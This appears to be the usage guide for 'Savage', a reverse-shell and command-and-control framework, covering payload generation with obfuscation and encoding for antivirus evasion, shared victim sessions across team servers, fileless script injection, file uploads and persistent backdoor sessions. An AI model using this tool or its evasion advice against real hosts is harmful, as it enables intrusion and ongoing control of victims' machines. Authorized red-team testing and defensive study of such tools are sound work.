# Usage Guide
:warning: Savage was explicitly developed and tested on **kali linux**.  
:warning: This guide is a work in progress currently describing key features. Check out Savage's introduction on youtube for more info.  

**Disclaimer**: Using this tool against hosts that you do not have explicit permission to test is illegal. You are responsible for any trouble you may cause by using this tool.

## Table of contents
1. [News](#News)
2. [Generate Reverse Shell Commands](#Generate-Reverse-Shell-Commands)
3. [Connect With Sibling Server](#Connect-With-Sibling-Server)
4. [Shell](#shell)
5. [Upload Command](#upload)
6. [Conptyshell](#Conptyshell)
7. [Exec](#Exec)
8. [Flee](#Flee)
9. [Purge](#Purge)
10. [Chat with Sibling Servers](#Chat-with-Sibling-Servers)
11. [Session Defender](#Session-Defender)


## Generate Reverse Shell Commands
Use the `generate` prompt command to generate payloads for Windows / Linux machines. 
In the latest Savage release, this function was redesigned to use payload templates (files). In `Core/payload_templates/<OS>/<HANDLER>/` you can find these templates, edit them, make your own, etc. Ultimately, you should replace the predefined Windows reverse shell commands with obfuscated versions. That way you can create a personalized instance of Savage and deal with AV evasion in a more productive and efficient way. 

Main logic:
```
generate payload=<OS_TYPE/HANDLER/PAYLOAD_TEMPLATE> lhost=<IP or INTERFACE> [ obfuscate encode ]
```

Handlers:
- reverse_tcp
- hoaxshell

The "payload" argument supports tab-autocomplete, allowing for quick selection of valid OS types, handlers, and templates.

Usage examples:
```
generate payload=windows/reverse_tcp/powershell lhost=eth0 encode
generate payload=linux/hoaxshell/sh_curl lhost=eth0 obfuscate
```

- The ENCODE and OBFUSCATE keywords are enabled for certain templates and can be used during payload generation. 
- For info on a particular template, use "generate" with PAYLOAD being the only provided argument.
- To catch HoaxShell https-based reverse shells you need to start Savage with SSL.
- Ultimately, one should edit the templates and add obfuscated versions of the commands for AV 
  evasion.

⚡Reverse TCP based shells are more stable and reliable than HoaxShell.
⚠️HoaxShell payloads are not reusable (will work only once). I will probably change that in the future.

Use the prompt commands `backdoors` and `sessions` to list info about your active shell sessions.

## Connect With Sibling Server
Use the `connect` prompt command to connect and share your shell sessions with another machine running Savage. 
```
connect <IP> <TEAM SERVER PORT>
```
By default, the Core server port is `65001` (you can change that with `-p` when starting Savage).

## The shell Command
Use the `shell` prompt command to start an interactive pseudo-shell for a shell session. The effectiveness of the pseudo shell is going to vary depending on the quality and stability of the shell session. Again, you should prefer TCP socket based shells as they will always be more stable than HoaxShell.
```
shell <SESSION ID or ALIAS>
```
Press Ctrl + C or type `exit` to return to the main Savage prompt.

## Upload
Use the `upload` pseudo shell prompt command to transfer a file from your system into an active session. The file will be http requested automatically from the Http File Smuggler (running by default on port 8888). The feature works regardless if the session is owned by you or a sibling server.

From an active pseudo shell prompt:
```
upload <LOCAL_FILE_PATH> <REMOTE_FILE_PATH>
```

## Conptyshell
Use the `conptyshell` prompt command to automatically slap `Invoke-ConPtyShell.ps1` against a shell session. A new terminal window with netcat listening will pop up (you need to have gnome-terminal installed) and the script will be executed on the target as a new process, meaning you get a fully interactive shell AND you get to keep your backdoor. Currently works only for powershell.exe backdoors.
Because I love Invoke-ConPtyShell.

Usage: 
```
conptyshell <IP or INTERFACE> <PORT> <SESSION ID or ALIAS>
```

## Inject
Use the `inject` pseudo shell prompt command to fileless exec a local script file over http against an active session. Files are executed by being http requested from the Http File Smuggler. The script you execute should much the shell session type (e.g., a PowerShell script script should be executed against a powershell.exe session, etc).  

Usage: 
```
inject </path/to/local/file> 
```

## Flee
Use the `flee` prompt command to exit Savage without terminating any active sessions. If you start Savage again later and there are still victim machines sending HoaxShell beacons, the sessions will be re-established automatically.  

## Purge
Savage automatically stores information regarding generated implants and loads them in memory every time it starts. This way, HoaxShell generated implants become reusable and it is possible to re-establish older sessions, assuming the payload is still running on the victim(s). Use the `purge` prompt command to delete all session related metadata. It does not affect any active sessions you may have.

## Chat with Sibling Servers
Commands starting with "#" are interpreted as messages and will be broadcasted to all connected Sibling Servers.

## Session Defender
Savage has a function that inspects user issued shell commands for input that may cause a backdoor shell session to hang (e.g., unclosed single/double quotes or backticks, commands that may start a new interactive session within the current shell and more). Use the `cmdinspector` command to turn that feature on/off.  

Usage: 
```
cmdinspector <ON/OFF>
```

